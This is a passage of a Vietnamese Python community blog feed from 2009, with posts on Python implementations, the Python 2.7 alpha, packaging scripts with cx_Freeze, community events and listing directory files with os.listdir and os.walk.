</content><category term="PYTHONIOENCODING"></category><category term="utf"></category><category term="getwriter"></category><category term="encode"></category><category term="unicode"></category><category term="print"></category></entry><entry><title>Các bản cài đặt (implementation) của Python</title><link href="/2009/12/cac-ban-cai-dat-implementation-cua-python.html" rel="alternate"></link><published>2009-12-14T04:09:00+07:00</published><updated>2009-12-14T04:09:00+07:00</updated><author><name>Võ Đức Phương</name></author><id>tag:None,2009-12-14:/2009/12/cac-ban-cai-dat-implementation-cua-python.html</id><summary type="html">&lt;p&gt;Có lẽ với nhiều người, khi nhắc tới Python sẽ chỉ nghĩ đến trình thông dịch được tải về từ trang web chính thức của ngôn ngữ này: &lt;a class="reference external" href="https://www.python.org"&gt;https://www.python.org&lt;/a&gt;. Thế nhưng để đến với ngôn ngữ lập trình Python thì không chỉ có &amp;quot;con đường&amp;quot; đó. Là …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Có lẽ với nhiều người, khi nhắc tới Python sẽ chỉ nghĩ đến trình thông dịch được tải về từ trang web chính thức của ngôn ngữ này: &lt;a class="reference external" href="https://www.python.org"&gt;https://www.python.org&lt;/a&gt;. Thế nhưng để đến với ngôn ngữ lập trình Python thì không chỉ có &amp;quot;con đường&amp;quot; đó. Là một chuẩn ngôn ngữ lập trình, Python có rất nhiều bản cài đặt khác nhau, với những mục tiêu cũng như những điểm mạnh, yếu khác nhau. Bài viết này sẽ giới thiệu một trong số những bản cài đặt đó, mong rằng nó sẽ hữu ích đối với những người muốn sử dụng Python nhưng vì một lí do nào đó mà không sử dụng được trình thông dịch chuẩn.&lt;/p&gt;
&lt;div class="section" id="cpython"&gt;
&lt;h2&gt;1- CPython&lt;/h2&gt;
&lt;p&gt;Phiên bản mới nhất: 2.6 và 3.1&lt;/p&gt;
&lt;p&gt;Đây chính là trình thông dịch chuẩn của Python, được coi là bản cài đặt tham chiếu cho ngôn ngữ này. Được viết bằng C và thực thi mã thông qua một trình thông dịch mã trung gian (bytecode interpreter). Là bản cài đặt chính thức, CPython có những tính năng mới nhất của Python, tuy nhiên bị hạn chế về một số mặt như tốc độ.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="jython"&gt;
&lt;h2&gt;2- Jython&lt;/h2&gt;
&lt;p&gt;Phiên bản mới nhất: 2.5&lt;/p&gt;
&lt;p&gt;Được viết bằng Java, chương trình Python sử dụng các lớp của Java (Java class) thay vì mô đun của Python. Ngoài hầu hết các mô đun trong thư viện chuẩn Python, Jython có một ưu điểm rất lớn là có thể sử dụng các lớp trong thư viện chuẩn của Java. Mã lệnh của Jython không được biên dịch ra dạng Python bytecode như CPython mà sang dạng Java bytecode tương tự như các chương trình Java, và tất nhiên mã lệnh này phải được thực thi bởi máy ảo Java chứ không phải trình thông dịch như trong trường hợp của CPython.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="ironpython"&gt;
&lt;h2&gt;3- IronPython&lt;/h2&gt;
&lt;p&gt;Phiên bản mới nhất: 2.0, 2.6 (alpha)&lt;/p&gt;
&lt;p&gt;Cũng tương tự như Jython, nhưng thay vì được biên dịch ra Java bytecode và thực thi bởi máy ảo Java, mã lệnh một chương trình IronPython được biên dịch sang dạng CIL (Common Intermediate Language) và thực thi bởi máy ảo .Net. Một chương trình viết bằng IronPython có thể sử dụng được các lớp của khung chương trình .Net, do vậy IronPython rất hữu dụng trong việc tích hợp vào một hệ thống viết bằng .Net.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="psyco"&gt;
&lt;h2&gt;4- Psyco&lt;/h2&gt;
&lt;p&gt;Phiên bản mới nhất: 1.6&lt;/p&gt;
&lt;p&gt;Là một bản cài đặt đặc biệt sử dụng phương thức biên dịch tức thời (Just in time compiling) nhằm cải thiện tốc độ thực thi của Python. Tùy thuộc vào loại tác vụ mà Psyco có thể tăng tốc từ 1,5 đến hơn 40 lần.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="pypy"&gt;
&lt;h2&gt;5- PyPy&lt;/h2&gt;
&lt;p&gt;Phiên bản mới nhất: 1.1&lt;/p&gt;
&lt;p&gt;Tiền thân là Psyco, PyPy được viết trên một tập con các lệnh của Python (restricted Python - RPython) nhằm nâng cao tính đa nền tảng so với Psyco, ngoài ra việc sử dụng chính Python để viết khiến cho việc thay đổi và tối ưu đơn giản hơn. Cũng như người tiền nhiệm, PyPy là một trình biên dịch tức thời cho phép cải thiện tốc độ thực thi so với CPython. Tuy bắt đầu là một dự án mang tính nghiên cứu nhưng vì thấy được những ưu điểm của PyPy, hiện các tác giả của PyPy đang tập trung vào việc tương thích với CPython nhằm đưa PyPy vào sử dụng trong thực tiễn.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="unladen-swallow"&gt;
&lt;h2&gt;6- Unladen Swallow&lt;/h2&gt;
&lt;p&gt;Phiên bản mới nhất: 2009Q3 (alpha)&lt;/p&gt;
&lt;p&gt;Là một dự án đặc biệt của Google cũng nhằm tăng tốc độ thực thi của Python, nhưng khác với Psyco hay Pypy là dựa trên nền tảng LLVM. Unladen Swallow có mục đích là tăng ít nhất gấp 5 lần tốc độ của CPython. Điều này sẽ rất có lợi cho Google, do hãng này ứng dụng Python rất nhiều.&lt;/p&gt;
&lt;p&gt;Ngoài những bản cài đặt ở trên, ngôn ngữ Python còn rất nhiều bản cài đặt khác như Stackless Python hay WPython v.v... tuy nhiên những bản cài đặt này thường có ứng dụng hẹp hơn, do vậy bài viết chỉ xin giới thiệu những bản cài đặt trên, mong rằng nếu như bạn không ưng ý với CPython thì giờ đây bạn có thể đến với Python theo một cách khác!&lt;/p&gt;
&lt;/div&gt;
</content><category term="implementation"></category></entry><entry><title>Python 2.7 alpha</title><link href="/2009/12/python-27-alpha.html" rel="alternate"></link><published>2009-12-08T03:38:00+07:00</published><updated>2009-12-08T03:38:00+07:00</updated><author><name>Võ Đức Phương</name></author><id>tag:None,2009-12-08:/2009/12/python-27-alpha.html</id><summary type="html">&lt;p&gt;Phiên bản thử nghiệm alpha của Python 2.7 đã được phát hành, phiên bản này không có thêm chức năng gì mới mà chủ yếu là sửa chữa lỗi cộng với việc backport các tính năng của python 3000 về lại, đây cũng sẽ là phiên bản cuối cùng …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Phiên bản thử nghiệm alpha của Python 2.7 đã được phát hành, phiên bản này không có thêm chức năng gì mới mà chủ yếu là sửa chữa lỗi cộng với việc backport các tính năng của python 3000 về lại, đây cũng sẽ là phiên bản cuối cùng của dòng Python 2.&lt;/p&gt;
&lt;p&gt;Theo đề xuất mới đây của Guido Van Rossum thì ngôn ngữ Python (cú pháp, thư viện tích hợp v.v...) sẽ tạm dừng phát triển trong vòng ít nhất 2 năm để cho các cài đặt khác của python như PyPy, Jython có thời gian để đuổi kịp nhánh cài đặt chính là CPython. Chính vì vậy mà 2 phiên bản 2.7 và 3.2 sẽ không có thay đổi gì quan trọng mà chỉ chủ yếu để sửa lỗi hay các nâng cấp nhỏ.&lt;/p&gt;
&lt;p&gt;Thông tin chi tiết về phiên bản Python 2.7 có tại: &lt;a class="reference external" href="http://www.python.org/download/releases/2.7/"&gt;http://www.python.org/download/releases/2.7/&lt;/a&gt;&lt;/p&gt;
</content><category term="release"></category><category term="2.7"></category></entry><entry><title>Đóng băng ứng dụng với cx_Freeze</title><link href="/2009/12/dong-bang-ung-dung-voi-cx_freeze.html" rel="alternate"></link><published>2009-12-01T05:54:00+07:00</published><updated>2009-12-01T05:54:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2009-12-01:/2009/12/dong-bang-ung-dung-voi-cx_freeze.html</id><summary type="html">&lt;p&gt;Python là ngôn ngữ thông dịch nên để chạy các ứng dụng viết bằng Python, chúng ta cần phải cài bộ thông dịch. Thao tác này hơi luộm thuộm đối với người dùng cuối, nên thông thường chúng ta hay tự hỏi liệu có cách nào đó để chuyển ứng …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Python là ngôn ngữ thông dịch nên để chạy các ứng dụng viết bằng Python, chúng ta cần phải cài bộ thông dịch. Thao tác này hơi luộm thuộm đối với người dùng cuối, nên thông thường chúng ta hay tự hỏi liệu có cách nào đó để chuyển ứng dụng của chúng ta thành một tập tin .EXE như các ứng dụng Windows khác không.&lt;/p&gt;
&lt;p&gt;Rất may mắn là chúng ta có thể đạt được mục đích này với chương trình &lt;a class="reference external" href="http://cx-freeze.sourceforge.net"&gt;cx_Freeze&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Chúng ta sẽ bắt đầu với một ví dụ đơn giản. Hãy tạo một tập tin &lt;tt class="docutils literal"&gt;helloworld.py&lt;/tt&gt; với nội dung sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# helloworld.py&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Khi chạy chương trình bé nhỏ này (giả sử nó đang nằm trong thư mục &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;c:\tmp&lt;/span&gt;&lt;/tt&gt;, chúng ta nhận kết quả như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
c:\tmp&amp;gt;c:\Python26\python helloworld.py
Hello World!
&lt;/pre&gt;
&lt;p&gt;Bây giờ chúng ta sẽ cài đặt cx_Freeze. Đối với ví dụ trên, chúng ta sẽ phải chọn bản cài đặt cho Windows, và cho phiên bản Python 2.6. Sau khi cài đặt cx_Freeze thì tập tin thực thi sẽ được đặt trong &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;c:\python26\scripts\cxfreeze&lt;/span&gt;&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Để đóng băng chương trình &lt;tt class="docutils literal"&gt;helloworld.py&lt;/tt&gt;, chúng ta thực hiện lệnh &lt;tt class="docutils literal"&gt;cxfreeze helloworld.py&lt;/tt&gt;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
c:\tmp&amp;gt;c:\Python26\scripts\cxfreeze helloworld.py
coyping c:\python26\lib\site-packages\cx_Freeze\bases\Console.exe -&amp;gt; c:\tmp\dist\helloworld.exe
coyping C:\Windows\system32\python26.dll -&amp;gt; c:\tmp\dist\python26.dll
writing zip file c:\tmp\dist\helloworld.exe

  Name                      File
  ----                      ----
m StringIO
m UserDict
m __builtin__
.
.
.
m warnings
m zipimport
m zlib

coyping c:\python26\DLLs\bz2.pyd -&amp;gt; c:\tmp\dist\bz2.pyd
coyping c:\python26\DLLs\select.pyd -&amp;gt; c:\tmp\dist\select.pyd
coyping c:\python26\DLLs\unicodedata.pyd -&amp;gt; c:\tmp\dist\unicodedata.pyd
&lt;/pre&gt;
&lt;p&gt;Kết quả của lệnh này là &lt;tt class="docutils literal"&gt;helloworld.py&lt;/tt&gt; được đóng băng trong thư mục &lt;tt class="docutils literal"&gt;dist&lt;/tt&gt;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
c:\tmp&amp;gt;dir /s dist
 Volume in drive C is OS
 Volume Serial Number is B07D-8588

 Directory of c:\tmp\dist

12/01/2009  12:42 PM    &amp;lt;DIR&amp;gt;          .
12/01/2009  12:42 PM    &amp;lt;DIR&amp;gt;          ..
12/01/2009  12:42 PM            71,168 bz2.pyd
12/01/2009  12:42 PM         1,423,792 helloworld.exe
12/01/2009  12:42 PM         2,149,888 python26.dll
12/01/2009  12:42 PM            11,776 select.pyd
12/01/2009  12:42 PM           585,728 unicodedata.pyd
               5 File(s)      4,242,352 bytes

     Total Files Listed:
               5 File(s)      4,242,352 bytes
               2 Dir(s)  118,923,808,768 bytes free
&lt;/pre&gt;
&lt;p&gt;Và bây giờ chúng ta có thể đóng gói, hoặc nén các tập tin trong thư mục này để chuyển đến người dùng cuối. Tập tin thực thi chính của chúng ta chính là &lt;tt class="docutils literal"&gt;helloworld.exe&lt;/tt&gt;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
c:\tmp&amp;gt;cd dist

c:\tmp\dist&amp;gt;helloworld.exe
Hello World!
&lt;/pre&gt;
&lt;p&gt;cx_Freeze còn nhận một số tham số dòng lệnh khác. Bạn có thể tham khảo thêm bằng cách chạy &lt;tt class="docutils literal"&gt;cxfreeze &lt;span class="pre"&gt;--help&lt;/span&gt;&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Ngoài cx_Freeze còn có một số công cụ khác có chức năng tương tự ví dụ như &lt;a class="reference external" href="http://www.py2exe.org/"&gt;py2exe&lt;/a&gt;.&lt;/p&gt;
</content><category term="exe"></category><category term="freeze"></category></entry><entry><title>Vithon hoạt động trở lại</title><link href="/2009/11/vithon-hoat-dong-tro-lai.html" rel="alternate"></link><published>2009-11-25T07:52:00+07:00</published><updated>2009-11-25T07:52:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2009-11-25:/2009/11/vithon-hoat-dong-tro-lai.html</id><summary type="html">&lt;p&gt;Trong vài ngày qua, vì máy chủ cần được nâng cấp nên trang mạng vithon.org đã tạm ngừng hoạt động. Trong khi chờ đợi máy chủ nâng cấp hoàn thành, trang vithon.org đã được di dời qua một máy chủ mới.&lt;/p&gt;
&lt;p&gt;Các bài viết và thảo luận diễn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong vài ngày qua, vì máy chủ cần được nâng cấp nên trang mạng vithon.org đã tạm ngừng hoạt động. Trong khi chờ đợi máy chủ nâng cấp hoàn thành, trang vithon.org đã được di dời qua một máy chủ mới.&lt;/p&gt;
&lt;p&gt;Các bài viết và thảo luận diễn đàn đã được sao lưu đầy đủ. Nhóm Python cho người Việt sẽ tải dần tất cả những bài viết và thảo luận diễn đàn lên trang mạng trong các ngày tới.&lt;/p&gt;
&lt;p&gt;Các bạn thành viên cũ có quyền cập nhật trang mạng xin vui lòng liên lạc quản trị để cấp lại tài khoản trên hệ thống Zine này.&lt;/p&gt;
&lt;p&gt;Chân thành cáo lỗi cùng các bạn vì sự bất tiện này.&lt;/p&gt;
</content><category term="vithon"></category></entry><entry><title>Hội thảo PyCon khu vực Châu Á - Thái Bình Dương 2010</title><link href="/2009/10/hoi-thao-pycon-khu-vuc-chau-a-thai-binh-duong-2010.html" rel="alternate"></link><published>2009-10-27T20:15:00+07:00</published><updated>2009-10-27T20:15:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2009-10-27:/2009/10/hoi-thao-pycon-khu-vuc-chau-a-thai-binh-duong-2010.html</id><summary type="html">&lt;img alt="" src="/static/pycon.apac.2010.jpg" /&gt;
&lt;div class="section" id="pycon-apac-2010"&gt;
&lt;h2&gt;PyCon APAC 2010&lt;/h2&gt;
&lt;p&gt;Hội thảo &lt;a class="reference external" href="http://apac.pycon.org/"&gt;PyCon Asia Pacific&lt;/a&gt; sẽ được tổ chức tại Singapore vào ngày 09 đến 11 tháng 06 năm 2010. Ngày 09 sẽ dành cho các bài hướng dẫn và ngày 10, 11 sẽ dành cho các bài thảo luận.&lt;/p&gt;
&lt;p&gt;Ban tổ chức kêu gọi sự tham …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;img alt="" src="/static/pycon.apac.2010.jpg" /&gt;
&lt;div class="section" id="pycon-apac-2010"&gt;
&lt;h2&gt;PyCon APAC 2010&lt;/h2&gt;
&lt;p&gt;Hội thảo &lt;a class="reference external" href="http://apac.pycon.org/"&gt;PyCon Asia Pacific&lt;/a&gt; sẽ được tổ chức tại Singapore vào ngày 09 đến 11 tháng 06 năm 2010. Ngày 09 sẽ dành cho các bài hướng dẫn và ngày 10, 11 sẽ dành cho các bài thảo luận.&lt;/p&gt;
&lt;p&gt;Ban tổ chức kêu gọi sự tham gia của các cá nhân, tập thể trong các bài hướng dẫn lẫn các bài tham luận hội thảo về tất cả các khía cạnh của Python -- từ lập trình không chuyên đến lập trình chuyên nghiệp, về các ứng dụng hoặc khung phần mềm, và bạn sử dụng Python như thế nào trong công việc.&lt;/p&gt;
&lt;p&gt;Các diễn giả lần đầu, đặc biệt là những diễn giả từ khu vực châu Á, được khuyến khích gửi bài cho ban tổ chức.&lt;/p&gt;
&lt;p&gt;Thông tin thêm về hội thảo PyCon Châu Á - Thái Bình Dương có thể được tìm thấy tại &lt;a class="reference external" href="http://apac.pycon.org/"&gt;http://apac.pycon.org/&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
</content><category term="pycon"></category><category term="apac"></category><category term="community"></category></entry><entry><title>Cộng đồng PCNV hỗ trợ GNOME.Asia</title><link href="/2009/10/cong-dong-pcnv-ho-tro-gnomeasia.html" rel="alternate"></link><published>2009-10-27T20:13:00+07:00</published><updated>2009-10-27T20:13:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2009-10-27:/2009/10/cong-dong-pcnv-ho-tro-gnomeasia.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="http://gnome.asia"&gt;&lt;img alt="GnomeAsia" src="/static/gnome.asia.2009.png" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PCNV là một trong những nhóm hỗ trợ cộng đồng tại hội thảo GNOME Asia 2009 tổ chức tại Công viên Phần mềm Quang Trung, thành phố Hồ Chí Minh.&lt;/p&gt;
&lt;p&gt;GNOME.Asia Summit diễn ra từ ngày 20 đến 22 tháng 11 năm 2009 tại Công viên phần mềm Quang …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a class="reference external" href="http://gnome.asia"&gt;&lt;img alt="GnomeAsia" src="/static/gnome.asia.2009.png" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PCNV là một trong những nhóm hỗ trợ cộng đồng tại hội thảo GNOME Asia 2009 tổ chức tại Công viên Phần mềm Quang Trung, thành phố Hồ Chí Minh.&lt;/p&gt;
&lt;p&gt;GNOME.Asia Summit diễn ra từ ngày 20 đến 22 tháng 11 năm 2009 tại Công viên phần mềm Quang Trung, thành phố Hồ Chí Minh, là một trong những sự kiện công nghệ nguồn mở hàng đầu trong khu vực, sẽ được đăng tải trên 20 tờ báo, đài truyền hình, và các diễn đàn trong và ngoài nước. Với mục đích khám phá tương lai của cộng đồng mã nguồn mở ở châu Á, và mở rộng cơ hội hợp tác Á-Âu, Gnome.Asia Summit dự kiến sẽ có sự tham gia của hơn 500 khách mời từ 10 quốc gia trên thế giới. Ban tổ chức trân trọng mời các cá nhân, đoàn thể có quan tâm cùng tham gia sự kiện này.&lt;/p&gt;
&lt;p&gt;Ngoài việc kêu gọi cộng đồng người sử dụng Python tham gia vào hội thảo GNOME Asia, nhóm PCNV của chúng ta cũng sẽ tham gia hội thảo với bài trình bày &lt;em&gt;Python cho phần đời còn lại&lt;/em&gt;. Đây cũng là một cơ hội để chúng ta cùng gặp mặt trực tiếp ngoài đời thường.&lt;/p&gt;
</content><category term="community"></category><category term="gnome"></category><category term="asia"></category></entry><entry><title>Duyệt qua các file trong một thư mục</title><link href="/2009/06/duyet-qua-cac-file-trong-mot-thu-muc.html" rel="alternate"></link><published>2009-06-20T03:45:00+07:00</published><updated>2009-06-20T03:45:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2009-06-20:/2009/06/duyet-qua-cac-file-trong-mot-thu-muc.html</id><summary type="html">&lt;p&gt;Bạn thường gặp bài toán liệt kê danh sách tất cả các file trong một thư mục cho trước. Dưới đây là một vài các cách khác nhau tùy theo hoàn cảnh.&lt;/p&gt;
&lt;div class="section" id="su-dung-os-listdir"&gt;
&lt;h2&gt;1. Sử dụng &lt;tt class="docutils literal"&gt;os.listdir&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;Câu lệnh sau sẽ lấy danh mục các file trong thư mục &lt;tt class="docutils literal"&gt;Test …&lt;/tt&gt;&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Bạn thường gặp bài toán liệt kê danh sách tất cả các file trong một thư mục cho trước. Dưới đây là một vài các cách khác nhau tùy theo hoàn cảnh.&lt;/p&gt;
&lt;div class="section" id="su-dung-os-listdir"&gt;
&lt;h2&gt;1. Sử dụng &lt;tt class="docutils literal"&gt;os.listdir&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;Câu lệnh sau sẽ lấy danh mục các file trong thư mục &lt;tt class="docutils literal"&gt;Test&lt;/tt&gt; nằm trong thư mục cá nhân của bạn.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;~/Test&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expanduser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;file 3&amp;#39;, &amp;#39;file 1&amp;#39;, &amp;#39;file 2&amp;#39;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;os.listdir&lt;/tt&gt; chỉ cho bạn tên file hoặc thư mục nằm trong đường dẫn đó. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/mnt/data/pictures/&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;Old&amp;#39;, &amp;#39;Icons&amp;#39;, &amp;#39;baby.jpg&amp;#39;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để có đường dẫn đầy đủ bạn có thể viết:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;/mnt/data/pictures/Old&amp;#39;, &amp;#39;/mnt/data/pictures/Icons&amp;#39;, &amp;#39;/mnt/data/pictures/baby.jpg&amp;#39;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để đảm bảo vấn đề tương thích mã khi chuyển qua lại giữa các hệ điều hành bạn luôn luôn nên dùng: &lt;tt class="docutils literal"&gt;os.path.join&lt;/tt&gt; để nối các đường dẫn, hoặc dùng &lt;tt class="docutils literal"&gt;os.path.sep&lt;/tt&gt; để cộng các đường dẫn.&lt;/p&gt;
&lt;p&gt;Không nên:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;path1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;\path2&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nên viết:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;path2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;hoặc&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;path1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;path2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trên Windows bạn có thể viết: &lt;tt class="docutils literal"&gt;path = &lt;span class="pre"&gt;&amp;quot;~/Test&amp;quot;&lt;/span&gt;&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;&amp;quot;~/test&amp;quot;&lt;/span&gt;&lt;/tt&gt; đều được. Linux phân biệt chữ hoa chữ thường nên phải viết chính xác &lt;tt class="docutils literal"&gt;Test&lt;/tt&gt;. Ký tự phân tách đường dẫn trên linux là &lt;tt class="docutils literal"&gt;&amp;quot;/&amp;quot;&lt;/tt&gt;, trên Windows bạn có thể viết &lt;tt class="docutils literal"&gt;&amp;quot;/&amp;quot;&lt;/tt&gt; hoặc tôi hay dùng &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;&amp;quot;\\&amp;quot;&lt;/span&gt;&lt;/tt&gt; (thay vì &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;`&amp;quot;\&amp;quot;&lt;/span&gt;&lt;/tt&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="su-dung-walk"&gt;
&lt;h2&gt;2. Sử dụng &lt;tt class="docutils literal"&gt;walk&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;os.listdir&lt;/tt&gt; chỉ liệt kê các file và thư mục trong một thư mục. Để lấy được cả danh sách đệ quy các file trong thư mục bạn có thể dùng &lt;tt class="docutils literal"&gt;os.walk&lt;/tt&gt; hoặc thư viện ngoài &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Hàm &lt;tt class="docutils literal"&gt;os.walk&lt;/tt&gt; là một &lt;em&gt;generator function&lt;/em&gt; và &lt;tt class="docutils literal"&gt;os.walk(path)&lt;/tt&gt; là một &lt;em&gt;generator object&lt;/em&gt;. Nghĩa là hàm trạng thái trả về các kết quả kế tiếp nhau theo yêu cầu. Mỗi một item của &lt;tt class="docutils literal"&gt;walk&lt;/tt&gt; có ba thành phần:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Thư mục hiện tại&lt;/li&gt;
&lt;li&gt;Các thư mục con&lt;/li&gt;
&lt;li&gt;Các file bên trong&lt;/li&gt;
&lt;/ol&gt;
